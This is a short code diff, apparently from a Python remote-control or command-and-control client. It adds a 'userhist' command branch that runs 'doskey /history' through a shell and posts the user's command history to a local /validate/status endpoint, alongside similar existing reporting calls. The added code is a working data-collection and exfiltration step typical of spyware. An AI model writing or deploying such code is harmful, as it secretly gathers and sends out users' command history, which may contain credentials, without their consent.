@@ -110,6 +110,12 @@ async def main():
                     await session.post('http://127.0.0.1:7000/validate/status/7', data=promptData)
 
 
+                if command == "userhist":
+
+                    result = run('doskey /history', stdout=PIPE, stderr=PIPE, universal_newlines=True, shell=True)
+                    await session.post('http://127.0.0.1:7000/validate/status/11', data=result.stdout)
+
+
     await main()
 
 
